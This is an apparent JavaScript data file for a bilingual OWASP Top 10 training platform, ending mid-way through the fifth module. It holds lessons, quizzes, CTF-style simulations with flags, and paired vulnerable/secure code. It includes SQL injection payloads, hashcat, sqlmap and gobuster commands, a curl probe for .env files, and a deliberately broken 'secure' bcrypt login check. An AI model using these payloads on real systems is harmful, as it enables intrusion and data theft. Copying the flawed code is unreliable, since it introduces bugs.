export const owaspEducationData = {
  'm01': {
    id: 'm01',
    title: 'Broken Access Control',
    icon: 'Lock',
    difficulty: 'HARD',
    severity: 'High',
    type: 'Access Control',
    cvss: '7.5',
    description: 'When users can act outside of their intended permissions.',
    objective: 'Bypass authorization checks to access sensitive administrative data.',
    objective_ar: 'تجاوز فحوصات التفويض للوصول إلى بيانات المسؤول الحساسة.',
    defense: 'Implement deny-by-default and robust middleware authorization.',
    defense_ar: 'طبّق سياسة الرفض الافتراضي وأضف middleware قوي للتحقق من الصلاحيات.',
    description_ar: 'عندما يستطيع المستخدمون التصرف خارج نطاق صلاحياتهم المحددة.',
    theory_ar: `
      <h3>ما هو كسر التحكم في الوصول؟</h3>
      <p>التحكم في الوصول يفرض سياسات تمنع المستخدمين من التصرف خارج صلاحياتهم. الإخفاقات تؤدي عادةً إلى كشف معلومات غير مصرح بها أو تعديل أو حذف البيانات.</p>
      <h3>كيف يحدث؟</h3>
      <ul>
        <li>تجاوز فحوصات التحكم بتعديل الـ URL أو حالة التطبيق الداخلية.</li>
        <li>السماح بعرض أو تعديل حساب شخص آخر عبر معرّفه (IDOR).</li>
        <li>الوصول لـ API بدون فحوصات تحكم على POST وPUT وDELETE.</li>
        <li>رفع الصلاحيات — التصرف كمسؤول وأنت مستخدم عادي.</li>
        <li>التلاعب بـ JWT token لتغيير الدور أو الصلاحيات.</li>
      </ul>
      <h3>منهجية الاختبار OWASP</h3>
      <ul>
        <li>رسم خريطة لجميع أدوار التطبيق وصلاحياتها المقصودة.</li>
        <li>اختبار التصعيد الأفقي (مستخدم A يصل لبيانات مستخدم B).</li>
        <li>اختبار التصعيد الرأسي (مستخدم عادي يصل لوظائف المسؤول).</li>
        <li>اختبار جميع معرّفات الكائنات (IDs, GUIDs) في الطلبات.</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>الرفض الافتراضي لجميع الموارد غير العامة.</li>
        <li>تطبيق آليات التحكم في الوصول مرة واحدة وإعادة استخدامها.</li>
        <li>تسجيل إخفاقات التحكم في الوصول وتنبيه المسؤولين.</li>
        <li>تحديد معدل الطلبات على API لتقليل أضرار الهجمات الآلية.</li>
      </ul>
    `,
    readTime: '8 min',
    xpReward: 150,
    realWorldCases: [
      { title: 'Facebook IDOR (2015)', impact: 'Delete any photo on the platform', cve: 'N/A' },
      { title: 'Parler Data Breach (2021)', impact: '70TB of data exposed via IDOR on media API', cve: 'N/A' },
      { title: 'HackerOne Report #213820', impact: 'Access private bug reports of any program', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'IDOR', description: 'Insecure Direct Object Reference — change ?id=123 to ?id=124', severity: 'High' },
      { name: 'Path Traversal', description: 'Access /admin by manipulating URL path', severity: 'High' },
      { name: 'Forced Browsing', description: 'Directly navigate to unlinked admin pages', severity: 'Medium' },
      { name: 'JWT Manipulation', description: 'Modify role claim in JWT payload', severity: 'Critical' }
    ],
    theory: `
      <h3>What is Broken Access Control?</h3>
      <p>Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data, or performing a business function outside the user's limits.</p>
      <h3>How does it happen?</h3>
      <ul>
        <li>Bypassing access control checks by modifying the URL, internal application state, or the HTML page.</li>
        <li>Permitting viewing or editing someone else's account by providing its unique identifier (IDOR).</li>
        <li>Accessing API with missing access controls for POST, PUT and DELETE.</li>
        <li>Elevation of privilege — acting as a user without being logged in, or acting as an admin when logged in as a user.</li>
        <li>Metadata manipulation, such as replaying or tampering with a JWT access control token.</li>
      </ul>
      <h3>OWASP Testing Methodology</h3>
      <ul>
        <li>Map all application roles and their intended permissions.</li>
        <li>Test horizontal privilege escalation (user A accessing user B's data).</li>
        <li>Test vertical privilege escalation (regular user accessing admin functions).</li>
        <li>Fuzz all object identifiers (IDs, GUIDs, filenames) in requests.</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Except for public resources, deny by default.</li>
        <li>Implement access control mechanisms once and re-use them throughout the application.</li>
        <li>Log access control failures and alert admins when appropriate.</li>
        <li>Rate limit API and controller access to minimize the harm from automated attack tooling.</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE CODE — IDOR Example
// ============================================
app.get('/api/account/:id', (req, res) => {
  // VULNERABLE: No ownership check
  const data = db.getAccount(req.params.id);
  res.json(data);
});

// ============================================
// SECURE CODE — With Authorization Middleware
// ============================================
const requireOwnership = (req, res, next) => {
  const resourceId = req.params.id;
  const requesterId = req.user.id;
  const isAdmin = req.user.role === 'admin';

  if (resourceId !== requesterId && !isAdmin) {
    return res.status(403).json({ error: 'Access Denied' });
  }
  next();
};

app.get('/api/account/:id',
  authenticate,        // Verify JWT
  requireOwnership,    // Check ownership
  (req, res) => {
    const data = db.getAccount(req.params.id);
    res.json(data);
  }
);`,
    quiz: [
      { q: 'What type of attack changes ?user_id=1 to ?user_id=2 to access another user\'s data?', options: ['XSS', 'IDOR', 'CSRF', 'SQLi'], answer: 1 },
      { q: 'Which HTTP status code should be returned when access is denied?', options: ['401', '404', '403', '500'], answer: 2 },
      { q: 'What is the recommended default access control policy?', options: ['Allow all, deny specific', 'Deny all, allow specific', 'Allow authenticated users', 'Role-based only'], answer: 1 }
    ],
    simulation: {
      targetSite: 'https://bank.cybercore.com/api/account?id=admin',
      vulnerableCode: `// Endpoint: GET /api/account?id=<user_id>
// No authorization check performed

app.get('/api/account', (req, res) => {
  const id = req.query.id;
  // ⚠️ IDOR: Any user can query any account
  const data = db.getAccount(id);
  res.json(data);
});`,
      terminalLogs: [
        '[07:41:55] SYS: [CONNECTION ESTABLISHED] Target: BankCore v2.0',
        '[07:41:56] RECON: Enumerating API endpoints...',
        '[07:41:57] FOUND: /api/account?id= parameter detected',
        '[07:41:58] TEST: Requesting own account id=1337...',
        '[07:41:59] RESPONSE: 200 OK — Account data returned',
        '[07:42:00] PIVOT: Changing id=1337 to id=1 (admin)...',
        '[07:42:01] ALERT: ⚠️ Admin account data returned — IDOR confirmed!'
      ],
      stages: [
        { id: 1, title: 'Recon', description: 'Identify the vulnerable parameter in the API endpoint', hint: 'Look at the URL query parameters' },
        { id: 2, title: 'Exploit', description: 'Change the user ID to access admin account data', hint: 'Try id=1 or id=admin' },
        { id: 3, title: 'Patch', description: 'Add ownership verification middleware to the route', hint: 'Compare req.user.id with the requested resource ID' }
      ],
      flag: 'FLAG{IDOR_B4nk_4cc3ss_Byp4ss}'
    }
  },
  'm02': {
    id: 'm02',
    title: 'Cryptographic Failures',
    icon: 'Key',
    difficulty: 'MEDIUM',
    severity: 'Critical',
    type: 'Cryptography',
    cvss: '9.1',
    description: 'Failures related to cryptography which often lead to sensitive data exposure.',
    objective: 'Identify and exploit weak hashing algorithms to crack user passwords.',
    objective_ar: 'تحديد واستغلال خوارزميات التشفير الضعيفة لكسر كلمات مرور المستخدمين.',
    defense: 'Use strong adaptive hashing functions like Argon2 or bcrypt with salts.',
    defense_ar: 'استخدم دوال تشفير قوية وتكيفية مثل Argon2 أو bcrypt مع salt عشوائي.',
    description_ar: 'إخفاقات تتعلق بالتشفير تؤدي إلى كشف البيانات الحساسة.',
    theory_ar: `
      <h3>ما هي إخفاقات التشفير؟</h3>
      <p>كانت تُعرف سابقاً بـ "كشف البيانات الحساسة". تركز هذه الفئة على الإخفاقات المتعلقة بالتشفير التي تؤدي إلى سرقة البيانات الحساسة ككلمات المرور وبيانات البطاقات الائتمانية.</p>
      <h3>كيف يحدث؟</h3>
      <ul>
        <li>نقل البيانات بنص واضح عبر HTTP أو SMTP أو FTP.</li>
        <li>تخزين كلمات المرور بـ MD5 أو SHA-1 بدون salt.</li>
        <li>استخدام خوارزميات تشفير قديمة ومكسورة (DES, RC4, MD5).</li>
        <li>توليد أو إعادة استخدام مفاتيح التشفير بطريقة غير آمنة.</li>
        <li>عدم التحقق من شهادة الخادم — يتيح هجمات MITM.</li>
      </ul>
      <h3>تحديد الثغرة</h3>
      <ul>
        <li>تحقق من نقل أي بيانات بنص واضح عبر HTTP.</li>
        <li>حدد خوارزمية التشفير المستخدمة (MD5 = 32 حرف hex، SHA-1 = 40 حرف).</li>
        <li>اختبر دعم إصدارات TLS باستخدام testssl.sh أو SSLyze.</li>
        <li>ابحث عن أسرار مضمّنة في الكود أو ملفات الإعداد.</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>صنّف البيانات وطبّق ضوابط الحماية حسب درجة حساسيتها.</li>
        <li>لا تخزن البيانات الحساسة إلا عند الضرورة القصوى.</li>
        <li>شفّر جميع البيانات أثناء النقل باستخدام TLS 1.2 أو أحدث.</li>
        <li>خزّن كلمات المرور باستخدام Argon2 أو bcrypt أو scrypt مع salt.</li>
        <li>عطّل التخزين المؤقت للاستجابات التي تحتوي على بيانات حساسة.</li>
      </ul>
    `,
    readTime: '10 min',
    xpReward: 200,
    realWorldCases: [
      { title: 'LinkedIn Breach (2012)', impact: '117M passwords hashed with unsalted SHA-1 cracked', cve: 'N/A' },
      { title: 'Adobe Breach (2013)', impact: '153M accounts with 3DES-ECB encrypted passwords leaked', cve: 'N/A' },
      { title: 'RockYou Breach (2009)', impact: '32M plaintext passwords exposed', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'MD5 Cracking', description: 'Rainbow table attacks against MD5 hashed passwords', severity: 'Critical' },
      { name: 'Cleartext Transmission', description: 'Intercepting HTTP traffic with sensitive data', severity: 'High' },
      { name: 'Weak Key Exchange', description: 'Exploiting deprecated TLS 1.0/1.1 protocols', severity: 'High' },
      { name: 'ECB Mode Attack', description: 'Pattern analysis on ECB-encrypted data', severity: 'Medium' }
    ],
    theory: `
      <h3>What are Cryptographic Failures?</h3>
      <p>Previously known as Sensitive Data Exposure, this category focuses on failures related to cryptography which often leads to sensitive data being exposed. Common issues include transmitting data in cleartext, using weak or outdated cryptographic algorithms, and improper key management.</p>
      <h3>How does it happen?</h3>
      <ul>
        <li>Data transmitted in cleartext using protocols like HTTP, SMTP, FTP.</li>
        <li>Passwords stored using weak hashing algorithms like MD5 or SHA-1 without salting.</li>
        <li>Deprecated cryptographic functions still in use (DES, RC4, MD5).</li>
        <li>Encryption keys generated or reused in an insecure manner.</li>
        <li>Server certificate not validated — enabling MITM attacks.</li>
      </ul>
      <h3>Identifying the Vulnerability</h3>
      <ul>
        <li>Check if any data is transmitted in cleartext over HTTP.</li>
        <li>Identify the hashing algorithm used for passwords (MD5 = 32 hex chars, SHA-1 = 40 hex chars).</li>
        <li>Test for TLS version support using tools like testssl.sh or SSLyze.</li>
        <li>Look for hardcoded secrets in source code or config files.</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Classify data processed, stored, or transmitted and apply controls per classification.</li>
        <li>Don't store sensitive data unnecessarily — discard it as soon as possible.</li>
        <li>Encrypt all data in transit with secure protocols (TLS 1.2+).</li>
        <li>Store passwords using strong adaptive and salted hashing functions: Argon2, bcrypt, scrypt.</li>
        <li>Disable caching for responses that contain sensitive data.</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE CODE — Weak Hashing
// ============================================
const crypto = require('crypto');

function saveUser(username, password) {
  // VULNERABLE: MD5 is broken, no salt
  const hash = crypto.createHash('md5').update(password).digest('hex');
  db.insert({ username, password: hash });
}

// ============================================
// SECURE CODE — bcrypt with salt rounds
// ============================================
const bcrypt = require('bcrypt');

async function saveUser(username, password) {
  // SECURE: bcrypt auto-generates salt, 12 rounds
  const hash = await bcrypt.hash(password, 12);
  db.insert({ username, password: hash });
}

async function verifyUser(username, inputPassword) {
  const user = await db.findUser(username);
  // SECURE: Timing-safe comparison
  const isValid = await bcrypt.compare(inputPassword, user.password);
  return isValid;
}`,
    quiz: [
      { q: 'Which hashing algorithm is considered cryptographically broken for passwords?', options: ['bcrypt', 'Argon2', 'MD5', 'scrypt'], answer: 2 },
      { q: 'What is the purpose of a "salt" in password hashing?', options: ['Speed up hashing', 'Prevent rainbow table attacks', 'Encrypt the hash', 'Compress the password'], answer: 1 },
      { q: 'Which TLS version should be the minimum for production?', options: ['TLS 1.0', 'TLS 1.1', 'TLS 1.2', 'SSL 3.0'], answer: 2 }
    ],
    simulation: {
      targetSite: 'https://portal.secure-vault.io/login',
      vulnerableCode: `// User registration endpoint
app.post('/register', (req, res) => {
  const { username, password } = req.body;
  
  // ⚠️ VULNERABLE: MD5 without salt
  const hash = md5(password);
  
  db.query(
    'INSERT INTO users (username, password) VALUES (?, ?)',
    [username, hash]
  );
});`,
      terminalLogs: [
        '[08:12:10] SYS: Crawling target for hash patterns...',
        '[08:12:11] SCAN: Database dump obtained via SQLi',
        '[08:12:12] FOUND: MD5 hashes detected in users table',
        '[08:12:13] CRACK: Loading rockyou.txt wordlist (14M entries)...',
        '[08:12:18] CRACK: admin:5f4dcc3b5aa765d61d8327deb882cf99',
        '[08:12:18] MATCH: Hash cracked → password: "password"',
        '[08:12:19] AUTH: Login successful as admin!'
      ],
      stages: [
        { id: 1, title: 'Identify', description: 'Determine the hashing algorithm used by analyzing hash length and format', hint: 'MD5 produces 32 hex characters' },
        { id: 2, title: 'Crack', description: 'Use a rainbow table or dictionary attack to crack the MD5 hash', hint: 'Try hashcat -m 0 hash.txt rockyou.txt' },
        { id: 3, title: 'Remediate', description: 'Replace MD5 with bcrypt and add proper salt rounds', hint: 'Use bcrypt.hash(password, 12)' }
      ],
      flag: 'FLAG{MD5_15_D34D_Us3_Bcrypt}'
    }
  },
  'm03': {
    id: 'm03',
    title: 'Injection (SQLi)',
    icon: 'Database',
    difficulty: 'EASY',
    severity: 'High',
    type: 'Injection',
    cvss: '8.4',
    description: 'Untrusted data is sent to an interpreter as part of a command or query.',
    objective: 'Inject SQL commands to bypass login or leak the entire user database.',
    objective_ar: 'حقن أوامر SQL لتجاوز تسجيل الدخول أو تسريب قاعدة بيانات المستخدمين كاملة.',
    defense: 'Use parameterized queries or ORMs instead of raw string concatenation.',
    defense_ar: 'استخدم Parameterized Queries أو ORM بدلاً من دمج النصوص مباشرة.',
    description_ar: 'إرسال بيانات غير موثوقة إلى مفسّر كجزء من أمر أو استعلام.',
    theory_ar: `
      <h3>ما هو SQL Injection؟</h3>
      <p>يحدث حقن SQL عندما يتم إرسال بيانات غير موثوقة إلى مفسّر كجزء من استعلام. يمكن للبيانات الخبيثة خداع المفسّر لتنفيذ أوامر غير مقصودة أو الوصول لبيانات بدون تصريح.</p>
      <h3>أنواع SQL Injection</h3>
      <ul>
        <li><strong>In-band SQLi:</strong> استخراج البيانات عبر نفس القناة المستخدمة للحقن (Error-based, Union-based).</li>
        <li><strong>Blind SQLi:</strong> لا تُعاد بيانات مباشرة — يُستنتج الجواب من استجابات Boolean أو تأخيرات زمنية.</li>
        <li><strong>Out-of-band SQLi:</strong> تسريب البيانات عبر DNS أو HTTP لخادم يتحكم فيه المهاجم.</li>
      </ul>
      <h3>منهجية الاختبار</h3>
      <ul>
        <li>حدد جميع نقاط الإدخال: النماذج، معاملات URL، الترويسات، الكوكيز.</li>
        <li>اختبر بعلامة اقتباس مفردة (') لإثارة أخطاء SQL.</li>
        <li>استخدم sqlmap للكشف الآلي: sqlmap -u "URL" --dbs</li>
        <li>اختبر الحقن الزمني: ' AND SLEEP(5)--</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>استخدم Parameterized Queries (Prepared Statements) — الدفاع الأساسي.</li>
        <li>استخدم Stored Procedures إذا كانت مطبّقة بأمان.</li>
        <li>تحقق من صحة المدخلات بقائمة بيضاء للتنسيقات المتوقعة.</li>
        <li>طبّق مبدأ أقل الصلاحيات على حسابات قاعدة البيانات.</li>
        <li>استخدم WAF كطبقة دفاع إضافية (ليس الدفاع الأساسي).</li>
      </ul>
    `,
    readTime: '12 min',
    xpReward: 120,
    realWorldCases: [
      { title: 'Heartland Payment Systems (2008)', impact: '130M credit card numbers stolen via SQLi', cve: 'N/A' },
      { title: 'Sony Pictures (2011)', impact: '1M user accounts exposed via basic SQLi', cve: 'N/A' },
      { title: 'TalkTalk Breach (2015)', impact: '157K customer records stolen, £400K fine', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'Classic SQLi', description: "\' OR 1=1 -- to bypass authentication", severity: 'Critical' },
      { name: 'Union-Based', description: 'UNION SELECT to extract data from other tables', severity: 'Critical' },
      { name: 'Blind Boolean', description: 'Infer data via true/false application responses', severity: 'High' },
      { name: 'Time-Based Blind', description: 'Use SLEEP() to extract data character by character', severity: 'High' },
      { name: 'Out-of-Band', description: 'Exfiltrate data via DNS or HTTP requests', severity: 'Medium' }
    ],
    theory: `
      <h3>What is SQL Injection?</h3>
      <p>SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.</p>
      <h3>Types of SQL Injection</h3>
      <ul>
        <li><strong>In-band SQLi:</strong> Data extracted through the same channel used to inject SQL (Error-based, Union-based).</li>
        <li><strong>Blind SQLi:</strong> No data returned directly — inferred via Boolean responses or time delays.</li>
        <li><strong>Out-of-band SQLi:</strong> Data exfiltrated via DNS lookups or HTTP requests to attacker-controlled server.</li>
      </ul>
      <h3>Testing Methodology</h3>
      <ul>
        <li>Identify all input vectors: forms, URL params, headers, cookies.</li>
        <li>Test with single quote (') to trigger SQL errors.</li>
        <li>Use sqlmap for automated detection: sqlmap -u "URL" --dbs</li>
        <li>Test for time-based blind: ' AND SLEEP(5)--</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Use parameterized queries (prepared statements) — the primary defense.</li>
        <li>Use stored procedures (if implemented safely).</li>
        <li>Whitelist input validation for expected data formats.</li>
        <li>Apply least privilege to database accounts.</li>
        <li>Use a WAF as a defense-in-depth measure (not primary defense).</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE CODE — String Concatenation
// ============================================
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // VULNERABLE: Direct string interpolation
  const query = \`SELECT * FROM users 
    WHERE username = '\${username}' 
    AND password = '\${password}'\`;
  
  db.execute(query); // ' OR '1'='1 bypasses this
});

// ============================================
// SECURE CODE — Parameterized Query
// ============================================
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // SECURE: Parameters are never interpreted as SQL
  const query = 'SELECT * FROM users WHERE username = ? AND password_hash = ?';
  const hashedPw = await bcrypt.hash(password, 10);
  
  const [rows] = await db.execute(query, [username, hashedPw]);
  
  if (rows.length === 0) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  res.json({ token: generateJWT(rows[0]) });
});`,
    quiz: [
      { q: "What does the payload ' OR '1'='1 do in a login form?", options: ['Crashes the database', 'Bypasses authentication', 'Deletes all users', 'Encrypts the query'], answer: 1 },
      { q: 'Which defense is the PRIMARY protection against SQL injection?', options: ['WAF', 'Input length limits', 'Parameterized queries', 'HTTPS'], answer: 2 },
      { q: 'What sqlmap flag lists all databases on the target?', options: ['--tables', '--dbs', '--dump', '--columns'], answer: 1 }
    ],
    simulation: {
      targetSite: 'https://store.vulnerable.com/login',
      vulnerableCode: `// Login endpoint — VULNERABLE
app.post('/login', (req, res) => {
  const { user, pass } = req.body;
  
  // ⚠️ VULNERABLE: Raw string concatenation
  const sql = "SELECT * FROM users WHERE " +
    "username='" + user + "' AND " +
    "password='" + pass + "'";
    
  db.query(sql, (err, result) => {
    if (result.length > 0) res.json({ auth: true });
    else res.json({ auth: false });
  });
});`,
      terminalLogs: [
        "[09:05:22] SYS: Target login form identified",
        "[09:05:23] TEST: Sending username: admin' --",
        "[09:05:23] QUERY: SELECT * FROM users WHERE username='admin'--' AND password=''",
        "[09:05:24] DB: Comment (--) truncated password check",
        "[09:05:24] VULN: Authentication bypassed!",
        "[09:05:25] DUMP: Running UNION attack to extract all users...",
        "[09:05:28] DATA: 847 user records extracted successfully"
      ],
      stages: [
        { id: 1, title: 'Detect', description: "Confirm SQLi by injecting a single quote (') and observing the error", hint: "Try username: admin' and see if you get a SQL error" },
        { id: 2, title: 'Bypass Auth', description: "Use a classic payload to bypass the login check", hint: "Try: admin'-- or ' OR '1'='1'--" },
        { id: 3, title: 'Extract Data', description: 'Use UNION SELECT to dump the users table', hint: "' UNION SELECT username,password FROM users--" },
        { id: 4, title: 'Patch', description: 'Replace string concatenation with parameterized queries', hint: 'Use db.execute(query, [username, password])' }
      ],
      flag: 'FLAG{SQLi_4uth_Byp4ss_M4st3r}'
    }
  },
  'm04': {
    id: 'm04',
    title: 'Insecure Design',
    icon: 'Code',
    difficulty: 'MEDIUM',
    severity: 'High',
    type: 'Business Logic',
    cvss: '7.1',
    description: 'Risks related to design and architectural flaws.',
    objective: 'Identify the hardcoded developer coupon in the source code and use it to get a 100% discount.',
    objective_ar: 'اكتشف كود الخصم المضمّن في الكود المصدري واستخدمه للحصول على خصم 100%.',
    defense: 'Separate Test/Prod Logic; Code Reviews; Threat Modeling.',
    defense_ar: 'افصل كود التطوير عن الإنتاج، راجع الكود بانتظام، وطبّق نمذجة التهديدات.',
    description_ar: 'مخاطر ناتجة عن عيوب في التصميم والهندسة المعمارية للتطبيق.',
    theory_ar: `
      <h3>ما هو التصميم غير الآمن؟</h3>
      <p>فئة واسعة تمثل نقاط ضعف ناتجة عن "تصميم ضوابط مفقودة أو غير فعّالة". يختلف عن التطبيق غير الآمن — التصميم الخاطئ لا يمكن إصلاحه بتطبيق مثالي.</p>
      <h3>عيوب منطق الأعمال</h3>
      <ul>
        <li>التطبيق يثق ببيانات العميل في قرارات حرجة (السعر، الكمية، الدور).</li>
        <li>غياب تحديد معدل الطلبات على العمليات الحساسة (إعادة تعيين كلمة المرور، OTP).</li>
        <li>يمكن للمهاجم تخطي خطوات أو إعادة ترتيبها في العمليات متعددة الخطوات.</li>
        <li>بيانات اعتماد مضمّنة أو أبواب خلفية تركت من مرحلة التطوير.</li>
      </ul>
      <h3>نهج نمذجة التهديدات</h3>
      <ul>
        <li>حدد الأصول: ما البيانات والوظائف التي تحتاج حماية؟</li>
        <li>حدد التهديدات: من هم المهاجمون وماذا يريدون؟</li>
        <li>حدد الضوابط: ما التخفيفات الموجودة؟</li>
        <li>استخدم نموذج STRIDE: انتحال الهوية، التلاعب، الإنكار، كشف المعلومات، DoS، رفع الصلاحيات.</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>أنشئ دورة تطوير آمنة مع متخصصي AppSec.</li>
        <li>طبّق نمذجة التهديدات على المصادقة والتحكم في الوصول ومنطق الأعمال.</li>
        <li>لا تثق أبداً بالقيم التي يرسلها العميل للسعر أو الكمية أو الدور.</li>
        <li>افصل كود التطوير/الاختبار عن الإنتاج — استخدم متغيرات البيئة.</li>
        <li>حدد استهلاك الموارد لكل مستخدم أو خدمة.</li>
      </ul>
    `,
    readTime: '9 min',
    xpReward: 130,
    realWorldCases: [
      { title: 'Starbucks Gift Card Flaw (2015)', impact: 'Unlimited balance transfer via race condition', cve: 'N/A' },
      { title: 'Instagram Account Takeover (2019)', impact: 'Password reset brute-force via missing rate limit', cve: 'N/A' },
      { title: 'Venmo Business Logic (2018)', impact: 'Send money without sufficient balance', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'Price Manipulation', description: 'Modify item price in client-side request', severity: 'Critical' },
      { name: 'Race Condition', description: 'Exploit timing windows to apply discounts multiple times', severity: 'High' },
      { name: 'Workflow Bypass', description: 'Skip required steps in multi-step processes', severity: 'High' },
      { name: 'Hardcoded Secrets', description: 'Find dev/test credentials left in production code', severity: 'Medium' }
    ],
    theory: `
      <h3>What is Insecure Design?</h3>
      <p>Insecure design is a broad category representing different weaknesses expressed as "missing or ineffective control design." It is distinct from insecure implementation — a securely implemented insecure design cannot be fixed by a perfect implementation.</p>
      <h3>Business Logic Flaws</h3>
      <ul>
        <li>The application trusts client-supplied data for critical decisions (price, quantity, role).</li>
        <li>Missing rate limits on sensitive operations (password reset, OTP verification).</li>
        <li>Workflow steps can be skipped or reordered by the attacker.</li>
        <li>Hardcoded credentials or backdoors left from development.</li>
      </ul>
      <h3>Threat Modeling Approach</h3>
      <ul>
        <li>Identify assets: What data/functions need protection?</li>
        <li>Identify threats: Who are the adversaries and what do they want?</li>
        <li>Identify controls: What mitigations are in place?</li>
        <li>Use STRIDE model: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege.</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Establish and use a secure development lifecycle with AppSec professionals.</li>
        <li>Use threat modeling for critical authentication, access control, and business logic.</li>
        <li>Never trust client-supplied values for price, quantity, or role.</li>
        <li>Separate development/test code from production — use environment variables.</li>
        <li>Limit resource consumption by user or service.</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE DESIGN — Client-Trusted Price
// ============================================
app.post('/checkout', (req, res) => {
  const { items, totalPrice, couponCode } = req.body;
  
  // VULNERABLE: Trusting client-supplied price
  let finalPrice = totalPrice;
  
  // VULNERABLE: Hardcoded dev backdoor
  if (couponCode === 'DEV_100_OFF') {
    finalPrice = 0;
  }
  
  processPayment(finalPrice);
});

// ============================================
// SECURE DESIGN — Server-Side Price Calculation
// ============================================
app.post('/checkout', async (req, res) => {
  const { itemIds, couponCode } = req.body;
  
  // SECURE: Fetch prices from database, never trust client
  const items = await db.getItemsByIds(itemIds);
  let finalPrice = items.reduce((sum, item) => sum + item.price, 0);
  
  // SECURE: Validate coupon server-side with expiry check
  if (couponCode) {
    const coupon = await db.getValidCoupon(couponCode);
    if (coupon && !coupon.isExpired && !coupon.isDevOnly) {
      finalPrice *= (1 - coupon.discountRate);
    }
  }
  
  processPayment(finalPrice);
});`,
    quiz: [
      { q: 'What is the core principle violated when an app trusts client-supplied prices?', options: ['Least Privilege', 'Defense in Depth', 'Never Trust User Input', 'Fail Securely'], answer: 2 },
      { q: 'Which framework helps identify design-level threats?', options: ['OWASP ZAP', 'STRIDE', 'Metasploit', 'Burp Suite'], answer: 1 },
      { q: 'What type of flaw allows applying a discount coupon multiple times simultaneously?', options: ['IDOR', 'Race Condition', 'SQLi', 'XSS'], answer: 1 }
    ],
    simulation: {
      targetSite: 'https://store.tech-giant.com/checkout',
      vulnerableCode: `// Checkout processor — VULNERABLE DESIGN
app.post('/checkout', (req, res) => {
  const { cart, price, coupon } = req.body;
  
  let total = price; // ⚠️ Trusting client price!
  
  // ⚠️ BACKDOOR: Dev coupon left in production
  if (coupon === 'DEV_100_OFF') {
    total = 0;
  }
  
  // ⚠️ No rate limiting on coupon attempts
  charge(req.user, total);
});`,
      terminalLogs: [
        '[07:41:55] SYS: Analyzing checkout flow...',
        '[07:41:56] RECON: Intercepting POST /checkout with Burp Suite',
        '[07:41:57] FOUND: price field is client-controlled',
        '[07:41:58] TEST: Modifying price from 299.99 to 0.01',
        '[07:41:59] RESPONSE: Order confirmed at $0.01!',
        '[07:42:00] SCAN: Searching source code for hardcoded strings...',
        '[07:42:02] FOUND: coupon code "DEV_100_OFF" in bundle.js',
        '[07:42:03] EXPLOIT: Applied DEV_100_OFF — total: $0.00'
      ],
      stages: [
        { id: 1, title: 'Intercept', description: 'Use a proxy to intercept the checkout POST request', hint: 'Use Burp Suite to capture the request' },
        { id: 2, title: 'Manipulate', description: 'Modify the price field in the intercepted request', hint: 'Change price: 299.99 to price: 0.01' },
        { id: 3, title: 'Source Recon', description: 'Search the JavaScript bundle for hardcoded coupon codes', hint: 'Search for "DEV_" or "ADMIN_" in the JS source' },
        { id: 4, title: 'Patch', description: 'Move price calculation server-side and remove dev backdoors', hint: 'Never trust req.body.price — always recalculate from DB' }
      ],
      flag: 'FLAG{Bus1n3ss_L0g1c_Fl4w_D3t3ct3d}'
    }
  },
  'm05': {
    id: 'm05',
    title: 'Security Misconfig',
    icon: 'Settings',
    difficulty: 'EASY',
    severity: 'Medium',
    type: 'Configuration',
    cvss: '5.3',
    description: 'Insecure default configurations, open cloud storage, verbose errors, etc.',
    objective: 'Find and exploit default credentials or exposed configuration files.',
    objective_ar: 'اكتشف واستغل بيانات الاعتماد الافتراضية أو ملفات الإعداد المكشوفة.',
    defense: 'Implement a repeatable hardening process and remove unused features.',
    defense_ar: 'طبّق عملية تصليب متكررة لكل بيئة وأزل الميزات غير المستخدمة.',
    description_ar: 'إعدادات افتراضية غير آمنة، تخزين سحابي مفتوح، رسائل خطأ مفصّلة.',
    theory_ar: `
      <h3>ما هو الإعداد الأمني الخاطئ؟</h3>
      <p>الإعداد الأمني الخاطئ هو المشكلة الأكثر شيوعاً. ينتج عن إعدادات افتراضية غير آمنة، إعدادات غير مكتملة، تخزين سحابي مفتوح، ترويسات HTTP خاطئة، ورسائل خطأ تكشف معلومات حساسة.</p>
      <h3>الإعدادات الخاطئة الشائعة</h3>
      <ul>
        <li>حسابات وكلمات مرور افتراضية لا تزال مفعّلة ولم تتغير.</li>
        <li>معالجة الأخطاء تكشف stack traces أو رسائل خطأ مفصّلة للمستخدمين.</li>
        <li>ميزات الأمان معطّلة أو غير مهيّأة بشكل آمن.</li>
        <li>الخادم لا يرسل ترويسات الأمان أو قيمها غير آمنة.</li>
        <li>منافذ وخدمات وصفحات وحسابات وصلاحيات غير ضرورية مفعّلة.</li>
        <li>أذونات التخزين السحابي مهيّأة بشكل خاطئ (قراءة/كتابة عامة).</li>
      </ul>
      <h3>تقنيات الاستكشاف</h3>
      <ul>
        <li>اختبار القوة الغاشمة للمجلدات: gobuster dir -u URL -w wordlist.txt</li>
        <li>التحقق من ملفات .env و.git والنسخ الاحتياطية: curl URL/.env</li>
        <li>البحث عن بيانات اعتماد افتراضية باستخدام Hydra أو Burp Intruder.</li>
        <li>تحليل ترويسات HTTP: curl -I URL</li>
        <li>فحص التخزين السحابي: aws s3 ls s3://bucket-name --no-sign-request</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
